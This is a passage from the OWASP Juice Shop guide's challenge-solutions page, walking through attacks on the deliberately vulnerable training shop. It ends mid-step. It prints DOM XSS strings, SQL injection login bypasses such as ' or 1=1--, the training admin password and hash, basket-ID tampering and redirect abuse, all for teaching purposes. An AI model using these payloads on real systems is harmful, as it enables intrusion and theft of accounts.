<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Challenge solutions :: Juice Shop Docs</title>
    <meta name="generator" content="Antora 3.1.2">
    <link rel="stylesheet" href="../../../../_/css/site.css">
    <script>var uiRootPath = '../../../../_'</script>
  </head>
  <body class="article">
<header class="header">
  <nav class="navbar">
    <div class="navbar-brand">
      <a class="navbar-item" href="../../../..">Juice Shop Docs</a>
      <button class="navbar-burger" data-target="topbar-nav">
        <span></span>
        <span></span>
        <span></span>
      </button>
    </div>
    <div id="topbar-nav" class="navbar-menu">
      <div class="navbar-end">
        <a class="navbar-item" href="#">Home</a>
        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link" href="#">Products</a>
          <div class="navbar-dropdown">
            <a class="navbar-item" href="#">Product A</a>
            <a class="navbar-item" href="#">Product B</a>
            <a class="navbar-item" href="#">Product C</a>
          </div>
        </div>
        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link" href="#">Services</a>
          <div class="navbar-dropdown">
            <a class="navbar-item" href="#">Service A</a>
            <a class="navbar-item" href="#">Service B</a>
            <a class="navbar-item" href="#">Service C</a>
          </div>
        </div>
        <div class="navbar-item">
          <span class="control">
            <a class="button is-primary" href="#">Download</a>
          </span>
        </div>
      </div>
    </div>
  </nav>
</header>
<div class="body">
<div class="nav-container" data-component="Juice Shop" data-version="test">
  <aside class="nav">
    <div class="panels">
<div class="nav-panel-menu is-active" data-panel="menu">
  <nav class="nav-menu">
    <h3 class="title"><a href="../../index.html">Juice shop Documentation</a></h3>
<ul class="nav-list">
  <li class="nav-item" data-depth="0">
<ul class="nav-list">
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Preface</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../introduction/readme.html">Introduction</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../introduction/motivation.html">Why OWASP Juice Shop exists</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../introduction/architecture.html">Architecture overview</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Part I - Hacking preparations</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/README.html">Hacking preparations</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/running.html">Running OWASP Juice Shop</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/categories.html">Vulnerability categories</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/challenges.html">Challenge tracking</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/rules.html">Hacking exercise rules</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/happy-path.html">Walking the "happy path"</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/customization.html">Customization</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part1/ctf.html">Hosting a CTF event</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Part II - Challenge hunting</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/README.html">Challenge hunting</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/score-board.html">Finding the Score Board</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/injection.html">Injection</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/broken-authentication.html">Broken Authentication</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/sensitive-data-exposure.html">Sensitive Data Exposure</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/xxe.html">XML External Entities (XXE)</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/improper-input-validation.html">Improper Input Validation</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/broken-access-control.html">Broken Access Control</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/security-misconfiguration.html">Security Misconfiguration</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/xss.html">Cross Site Scripting (XSS)</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/insecure-deserialization.html">Insecure Deserialization</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/vulnerable-components.html">Vulnerable Components</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/security-through-obscurity.html">Security through Obscurity</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/unvalidated-redirects.html">Unvalidated Redirects</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/broken-anti-automation.html">Broken Anti-Automation</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/cryptographic-issues.html">Cryptographic Issues</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part2/miscellaneous.html">Miscellaneous</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Part III - Getting involved</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/README.html">Getting involved</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/feedback.html">Provide feedback</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/contribution.html">Contribute to development</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/codebase.html">Codebase 101</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/translation.html">Help with translation</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/tutorials.html">Hacking Instructor tutorial scripts</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../part3/donations.html">Donations</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Appendix</span>
<ul class="nav-list">
  <li class="nav-item is-current-page" data-depth="2">
    <a class="nav-link" href="solutions.html">Challenge solutions</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="trainers.html">Trainer&#8217;s guide</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="troubleshooting.html">Troubleshooting</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="cheat-detection.html">Cheat detection</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="code-snippets.html">Coding challenges</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="integration.html">Integration</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="monitoring.html">Monitoring</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="chatbot.html">Chatbot training data</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="lyrics.html">Jingle lyrics</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle"></button>
    <span class="nav-text">Postface</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="../introduction/about.html">About this book</a>
  </li>
</ul>
  </li>
</ul>
  </li>
</ul>
  </nav>
</div>
<div class="nav-panel-explore" data-panel="explore">
  <div class="context">
    <span class="title">Juice shop Documentation</span>
    <span class="version">test</span>
  </div>
  <ul class="components">
    <li class="component is-current">
      <a class="title" href="../../index.html">Juice shop Documentation</a>
      <ul class="versions">
        <li class="version is-current is-latest">
          <a href="../../index.html">test</a>
        </li>
      </ul>
    </li>
  </ul>
</div>
    </div>
  </aside>
</div>
<main class="article">
<div class="toolbar" role="navigation">
<button class="nav-toggle"></button>
<nav class="breadcrumbs" aria-label="breadcrumbs">
  <ul>
    <li><a href="../../index.html">Juice shop Documentation</a></li>
    <li>Appendix</li>
    <li><a href="solutions.html">Challenge solutions</a></li>
  </ul>
</nav>
  <div class="edit-this-page"><a href="file:///Users/parthnanda/Desktop/development/juice-shop-documentation-test/modules/Root/pages/appendix/solutions.adoc">Edit this Page</a></div>
</div>
  <div class="content">
<aside class="toc sidebar" data-title="Contents" data-levels="2">
  <div class="toc-menu"></div>
</aside>
<article class="doc">
<h1 class="page">Challenge solutions</h1>
<div id="preamble">
<div class="sectionbody">
<div class="paragraph">
<p>All URLs in the challenge solutions assume you are running the
application locally and on the default port <a href="http://localhost:3000" class="bare">http://localhost:3000</a>.
Change the URL accordingly if you use a different root URL.</p>
</div>
<div class="paragraph">
<p>Often there are multiple ways to solve a challenge. In most cases just
one possible solution is presented here. This is typically the easiest
or most obvious one from the author&#8217;s perspective.</p>
</div>
<div class="paragraph">
<p><em>The challenge solutions found in this release of the companion guide
are compatible with {{book.juiceShopVersion}} of OWASP Juice Shop.</em></p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges"><a class="anchor" href="#_challenges"></a>⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_receive_a_coupon_code_from_the_support_chatbot"><a class="anchor" href="#_receive_a_coupon_code_from_the_support_chatbot"></a>Receive a coupon code from the support chatbot</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Click <em>Support Chat</em> in the sidebar menu to visit
<a href="http://localhost:3000/#/chatbot" class="bare">http://localhost:3000/#/chatbot</a>.</p>
</li>
<li>
<p>After telling the chatbot your name you can start chatting with it.</p>
</li>
<li>
<p>Ask it something similar to "Can I have a coupon code?" or "Please
give me a discount!" and it will most likely decline with some
unlikely excuse.</p>
</li>
<li>
<p>Keep asking for discount again and again until you finally receive a
10% coupon code for the current month! This also solves the challenge
immediately.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_use_the_bonus_payload_in_the_dom_xss_challenge"><a class="anchor" href="#_use_the_bonus_payload_in_the_dom_xss_challenge"></a>Use the bonus payload in the DOM XSS challenge</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve the <a href="#perform-a-dom-xss-attack">Perform a DOM XSS attack</a>
challenge</p>
</li>
<li>
<p>Turn on your computer&#8217;s speakers!</p>
</li>
<li>
<p>Paste the payload <code>&lt;iframe width="100%" height="166" scrolling="no"
frameborder="no" allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true"&gt;&lt;/iframe&gt;</code>
into the <em>Search&#8230;&#8203;</em> field and hit Enter</p>
</li>
<li>
<p>Enjoy the excellent acoustic entertainment!</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_access_a_confidential_document"><a class="anchor" href="#_access_a_confidential_document"></a>Access a confidential document</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Follow the link to titled <em>Check out our boring terms of use if you
are interested in such lame stuff</em>
(<a href="http://localhost:3000/ftp/legal.md" class="bare">http://localhost:3000/ftp/legal.md</a>) on the <em>About Us</em> page.</p>
</li>
<li>
<p>Successfully attempt to browse the directory by changing the URL into
<a href="http://localhost:3000/ftp" class="bare">http://localhost:3000/ftp</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/ftp_directory.png" alt="FTP directory browser">
</div>
</div>
</li>
<li>
<p>Open <a href="http://localhost:3000/ftp/acquisitions.md" class="bare">http://localhost:3000/ftp/acquisitions.md</a> to solve the
challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_provoke_an_error_that_is_neither_very_gracefully_nor_consistently_handled"><a class="anchor" href="#_provoke_an_error_that_is_neither_very_gracefully_nor_consistently_handled"></a>Provoke an error that is neither very gracefully nor consistently handled</h3>
<div class="paragraph">
<p>Any request that cannot be properly handled by the server will
eventually be passed to a global error handling component that sends an
error page to the client that includes a stack trace and other sensitive
information. The restful API behaves similarly, passing back a JSON
error object with sensitive data, such as SQL query strings.</p>
</div>
<div class="paragraph">
<p>Here are two examples (out of many ways) to provoke such an error
situation and solve this challenge immediately:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Visit <a href="http://localhost:3000/rest/qwertz" class="bare">http://localhost:3000/rest/qwertz</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/error_page-500.png" alt="500 Error">
</div>
</div>
</li>
<li>
<p>Log in to the application with <code>'</code> (single-quote) as <em>Email</em> and
anything as <em>Password</em></p>
<div class="paragraph">
<p><span class="image"><img src="../_images/appendix/login-error_js.png" alt="Object Error in Login form"></span>
<span class="image"><img src="../_images/appendix/error_js-console.png" alt="SQL error in JS console"></span></p>
</div>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_find_the_endpoint_that_serves_usage_data_to_be_scraped_by_a_popular_monitoring_system"><a class="anchor" href="#_find_the_endpoint_that_serves_usage_data_to_be_scraped_by_a_popular_monitoring_system"></a>Find the endpoint that serves usage data to be scraped by a popular monitoring system</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Scroll through <a href="https://prometheus.io/docs/introduction/first_steps" class="bare">https://prometheus.io/docs/introduction/first_steps</a></p>
</li>
<li>
<p>You should notice several mentions of <code>/metrics</code> as the default path
scraped by Prometheus, e.g. "Prometheus expects metrics to be
available on targets on a path of <code>/metrics</code>."</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/metrics" class="bare">http://localhost:3000/metrics</a> to view the actual Prometheus
metrics of the Juice Shop and solve this challenge</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_close_multiple_challenge_solved_notifications_in_one_go"><a class="anchor" href="#_close_multiple_challenge_solved_notifications_in_one_go"></a>Close multiple "Challenge solved"-notifications in one go</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Read the <a href="../part1/challenges.md#success-notifications">Success Notifications</a> section</p>
</li>
<li>
<p>It will explain that <code>Shift</code>-clicking the <em>X</em>-button on any "Challenge solved"-notification will close all open notifications of this kind</p>
</li>
<li>
<p>Solve any other challenge (or multiple) and then <code>Shift</code>-click the <em>X</em>-button on it to solve this challenge</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>If you already have solved all but this challenge, you can just restart your Juice Shop instance to see all previous notifications again and then perform step 3 as described above.</p>
</div>
</div>
<div class="sect2">
<h3 id="_retrieve_the_photo_of_bjoerns_cat_in_melee_combat_mode"><a class="anchor" href="#_retrieve_the_photo_of_bjoerns_cat_in_melee_combat_mode"></a>Retrieve the photo of Bjoern&#8217;s cat in "melee combat-mode"</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/photo-wall" class="bare">http://localhost:3000/#/photo-wall</a></p>
</li>
<li>
<p>Right-click <em>Inspect</em> the broken image in the entry labeled "😼
#zatschi #whoneedsfourlegs"</p>
</li>
<li>
<p>You should find an image tag similar to <code>&lt;img _ngcontent-akt-c18=""
class="image"
src="assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg"
alt="😼 #zatschi #whoneedsfourlegs"&gt;</code> in the source</p>
</li>
<li>
<p>Right-click <em>Open in new tab</em> the <code>src</code> element of the image</p>
</li>
<li>
<p>Observe (in your DevTools <em>Network</em> tab) that the request sent to the
server is
<a href="http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-" class="bare">http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-</a></p>
</li>
<li>
<p>The culprit here are the two <code>#</code> characters in the URL, which are no
problem for your OS in a filename, but are interpreted by your
browser as HTML anchors. Thus, they are not transmitted to the server
at all.</p>
</li>
<li>
<p>To get them over to the server intact, they must obviously be
URL-encoded into <code>%23</code></p>
</li>
<li>
<p>Open
<a href="http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg" class="bare">http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg</a>
and enjoy the incredibly cute photo of this pet being happy despite
missing half a hind leg</p>
</li>
<li>
<p>Go back to the application, and the challenge will be solved.</p>
</li>
</ol>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zaya_melee.jpg" alt="Zaya in melee combat mode">
</div>
</div>
</div>
<div class="sect2">
<h3 id="_let_us_redirect_you_to_one_of_our_crypto_currency_addresses"><a class="anchor" href="#_let_us_redirect_you_to_one_of_our_crypto_currency_addresses"></a>Let us redirect you to one of our crypto currency addresses</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in to the application with any user.</p>
</li>
<li>
<p>Visit the <em>Your Basket</em> page and expand the <em>Payment</em> and
<em>Merchandise</em> sections with the "credit card"-button.</p>
</li>
<li>
<p>Perceive that all donation links are passed through the <code>to</code>
parameter of the route <code>/redirect</code></p>
</li>
<li>
<p>Open <code>main.js</code> in your browser&#8217;s DevTools</p>
</li>
<li>
<p>Searching for <code>/redirect?to=</code> and stepping through all matches you
will notice three functions that are called only from hidden buttons
on the <em>Your Basket</em> page:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/cryptoLinks.png" alt="Hidden crypto currency link functions">
</div>
</div>
</li>
<li>
<p>Open one of the three, e.g.
<a href="http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm" class="bare">http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm</a>
to solve the challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_read_our_privacy_policy"><a class="anchor" href="#_read_our_privacy_policy"></a>Read our privacy policy</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in to the application with any user.</p>
</li>
<li>
<p>Open the dropdown menu on your profile picture and choose <em>Privacy &amp;
Security</em>.</p>
</li>
<li>
<p>You will find yourself on
<a href="http://localhost:3000/#/privacy-security/privacy-policy" class="bare">http://localhost:3000/#/privacy-security/privacy-policy</a> which
instantly solves this challenge for you.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_follow_the_dry_principle_while_registering_a_user"><a class="anchor" href="#_follow_the_dry_principle_while_registering_a_user"></a>Follow the DRY principle while registering a user</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to <a href="http://localhost:3000/#/register" class="bare">http://localhost:3000/#/register</a>.</p>
</li>
<li>
<p>Fill out all required information except the <em>Password</em> and <em>Repeat
Password</em> field.</p>
</li>
<li>
<p>Type e.g. <code>12345</code> into the <em>Password</em> field.</p>
</li>
<li>
<p>Now type <code>12345</code> into the <em>Repeat Password</em> field. While typing the
numbers you will see <em>Passwords do not match</em> errors until you reach
<code>12345</code>.</p>
</li>
<li>
<p>Finally, go back to the <em>Password</em> field and change it into any other
password. The <em>Repeat Password</em> field does not show the expected
error.</p>
</li>
<li>
<p>Submit the form with <em>Register</em> which will solve this challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_find_the_carefully_hidden_score_board_page"><a class="anchor" href="#_find_the_carefully_hidden_score_board_page"></a>Find the carefully hidden 'Score Board' page</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to the <em>Sources</em> tab of your browsers DevTools and open the
<code>main.js</code> file.</p>
</li>
<li>
<p>If your browser offers pretty-printing of this minified messy code,
best use this offer. In Chrome this can be done with the "{}"-button.</p>
</li>
<li>
<p>Search for <code>score</code> and iterate through each finding to come across
one looking like a route mapping section:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/score-board_route.png" alt="Route Mapping the the Score Board">
</div>
</div>
</li>
<li>
<p>Navigate to <a href="http://localhost:3000/#/score-board" class="bare">http://localhost:3000/#/score-board</a> to solve the
challenge.</p>
</li>
<li>
<p>From now on you will see the additional menu item <em>Score Board</em> in
the navigation bar.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_dom_xss_attack"><a class="anchor" href="#_perform_a_dom_xss_attack"></a>Perform a DOM XSS attack</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Paste the attack string <code>&lt;iframe src="javascript:alert(`xss</code>)"&gt;`
into the <em>Search&#8230;&#8203;</em> field.</p>
</li>
<li>
<p>Hit the Enter key.</p>
</li>
<li>
<p>An alert box with the text "xss" should appear.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss1_alert.png" alt="XSS alert box">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_give_a_devastating_zero_star_feedback_to_the_store"><a class="anchor" href="#_give_a_devastating_zero_star_feedback_to_the_store"></a>Give a devastating zero-star feedback to the store</h3>
<div class="paragraph">
<p>Place an order that makes you rich. Visit the <em>Contact Us</em> form and put
in a <em>Comment</em> text. Also solve the CAPTCHA at the bottom of the form.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The <em>Submit</em> button is still <strong>disabled</strong> because you did not select
a <em>Rating</em> yet.</p>
</li>
<li>
<p>Inspect the <em>Submit</em> button with your DevTools and note the
<code>disabled</code> attribute of the <code>&lt;button&gt;</code> HTML tag</p>
</li>
<li>
<p>Double click on <code>disabled</code> attribute to select it and then delete it
from the tag.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/contact_disabled_submit-button.png" alt="Disabled Submit Button in Contact Us form">
</div>
</div>
</li>
<li>
<p>The <em>Submit</em> button is now <strong>enabled</strong>.</p>
</li>
<li>
<p>Click the <em>Submit</em> button to solve the challenge.</p>
</li>
<li>
<p>You can verify the feedback was saved by checking the <em>Customer
Feedback</em> widget on the <em>About Us</em> page.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zero_star_feedback-carousel.png" alt="Zero star feedback in carousel">
</div>
</div>
</li>
</ol>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges_2"><a class="anchor" href="#_challenges_2"></a>⭐⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_access_the_administration_section_of_the_store"><a class="anchor" href="#_access_the_administration_section_of_the_store"></a>Access the administration section of the store</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open the <code>main.js</code> in your browser&#8217;s developer tools and
search for "admin".</p>
</li>
<li>
<p>One of the matches will be a route mapping to <code>path:
"administration"</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-admin.png" alt="Administration page route in main.js">
</div>
</div>
</li>
<li>
<p>Navigating to <a href="http://localhost:3000/#/administration" class="bare">http://localhost:3000/#/administration</a> will give a <code>403
Forbidden</code> error.</p>
</li>
<li>
<p>Log in to an administrator&#8217;s account by solving the challenge</p>
<div class="ulist">
<ul>
<li>
<p><a href="#log-in-with-the-administrators-user-account">Log in with the administrator&#8217;s user account</a>
or</p>
</li>
<li>
<p><a href="#log-in-with-the-administrators-user-credentials-without-previously-changing-them-or-applying-sql-injection">Log in with the administrator&#8217;s user credentials without previously changing them or applying SQL Injection</a>
first and then navigate to <a href="http://localhost:3000/#/administration" class="bare">http://localhost:3000/#/administration</a>
will solve the challenge.</p>
</li>
</ul>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_view_another_users_shopping_basket"><a class="anchor" href="#_view_another_users_shopping_basket"></a>View another user&#8217;s shopping basket</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Put some products into your shopping basket.</p>
</li>
<li>
<p>Inspect the <em>Session Storage</em> in your browser&#8217;s developer tools to
find a numeric <code>bid</code> value.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/session_storage.png" alt="Basket ID in Session Storage">
</div>
</div>
</li>
<li>
<p>Change the <code>bid</code>, e.g. by adding or subtracting 1 from its value.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/basket" class="bare">http://localhost:3000/#/basket</a> to solve the challenge.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>If the challenge is not immediately solved, you might have to
<code>F5</code>-reload to relay the <code>bid</code> change to the Angular client.</p>
</div>
</div>
<div class="sect2">
<h3 id="_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down"><a class="anchor" href="#_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down"></a>Use a deprecated B2B interface that was not properly shut down</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Click <em>Complain?</em> in the <em>Contact Us</em> dropdown to go to the <em>File
Complaint</em> form</p>
</li>
<li>
<p>Clicking the file upload button for <em>Invoice</em> and browsing some
directories you might notice that <code>.pdf</code> and <code>.zip</code> files are
filtered by default</p>
</li>
<li>
<p>Trying to upload another other file will probably give you an error
message on the UI stating exactly that: <code>Forbidden file type. Only
PDF, ZIP allowed.</code></p>
</li>
<li>
<p>Open the <code>main.js</code> in your DevTools and find the declaration
of the file upload (e.g. by searching for <code>zip</code>)</p>
</li>
<li>
<p>In the <code>allowedMimeType</code> array you will notice <code>"application/xml"</code>
and <code>"text/xml"</code> along with the expected PDF and ZIP types</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/complaint_xml_mime-type.png" alt="Possible XML upload spoilered in main.js">
</div>
</div>
</li>
<li>
<p>Click on the <em>Choose File</em> button.</p>
</li>
<li>
<p>In the <em>File Name</em> field enter <code>*.xml</code> and select any arbitrary XML
file (&lt;100KB) you have available. Then press <em>Open</em>.</p>
</li>
<li>
<p>Enter some <em>Message</em> text and press <em>Submit</em> to solve the challenge.</p>
</li>
<li>
<p>On the JavaScript Console of your browser you will see a suspicious
<code>410 (Gone)</code> HTTP Error. In the corresponding entry in the Network
section of your browser&#8217;s DevTools, you should see an error message,
telling you that <code>B2B customer complaints via file upload have been
deprecated for security reasons!</code></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_get_rid_of_all_5_star_customer_feedback"><a class="anchor" href="#_get_rid_of_all_5_star_customer_feedback"></a>Get rid of all 5-star customer feedback</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in to the application with any user.</p>
</li>
<li>
<p>Solve
<a href="#access-the-administration-section-of-the-store">Access the administration section of the store</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/customer_feedback-table.png" alt="Feedback table on Administration page">
</div>
</div>
</li>
<li>
<p>Delete all entries with five star rating from the <em>Customer Feedback</em>
table using the trashcan button</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_the_administrators_user_account"><a class="anchor" href="#_log_in_with_the_administrators_user_account"></a>Log in with the administrator&#8217;s user account</h3>
<div class="ulist">
<ul>
<li>
<p>Log in with <em>Email</em> <code>' or 1=1--</code> and any <em>Password</em> which will
authenticate the first entry in the <code>Users</code> table which coincidentally
happens to be the administrator</p>
</li>
<li>
<p>or log in with <em>Email</em> <code>admin@juice-sh.op'--</code> and any <em>Password</em> if
you already know the email address of the administrator</p>
</li>
<li>
<p>or log in with <em>Email</em> <code>admin@juice-sh.op</code> and <em>Password</em> <code>admin123</code>
if you looked up the administrator&#8217;s password hash
<code>0192023a7bbd73250516f069df18b500</code> in a rainbow table after harvesting
the user data by
<a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">retrieving a list of all user credentials via SQL Injection</a>.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_mc_safesearchs_original_user_credentials"><a class="anchor" href="#_log_in_with_mc_safesearchs_original_user_credentials"></a>Log in with MC SafeSearch&#8217;s original user credentials</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Reading the hints for this challenge or googling "MC SafeSearch" will
eventually bring the music video
<a href="https://www.youtube.com/watch?v=v59CX2DiX0Y">"Protect Ya' Passwordz"</a>
to your attention.</p>
</li>
<li>
<p>Watch this video to learn that MC used the name of his dog "Mr.
Noodles" as a password but changed "some vowels into zeroes".</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a> and log in with <em>Email</em>
<code>mc.safesearch@juice-sh.op</code> and <em>Password</em> <code>Mr. N00dles</code> to solve
this challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_the_administrators_user_credentials_without_previously_changing_them_or_applying_sql_injection"><a class="anchor" href="#_log_in_with_the_administrators_user_credentials_without_previously_changing_them_or_applying_sql_injection"></a>Log in with the administrator&#8217;s user credentials without previously changing them or applying SQL Injection</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a>.</p>
</li>
<li>
<p>Log in with <em>Email</em> <code>admin@juice-sh.op</code> and <em>Password</em> <code>admin123</code>
which is as easy to guess as it is to brute force or retrieve from a
rainbow table.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_behave_like_any_white_hat_should_before_getting_into_the_action"><a class="anchor" href="#_behave_like_any_white_hat_should_before_getting_into_the_action"></a>Behave like any "white hat" should before getting into the action</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="https://securitytxt.org/" class="bare">https://securitytxt.org/</a> to learn about a proposed standard
which allows websites to define security policies.</p>
</li>
<li>
<p>Request the security policy file from the server at
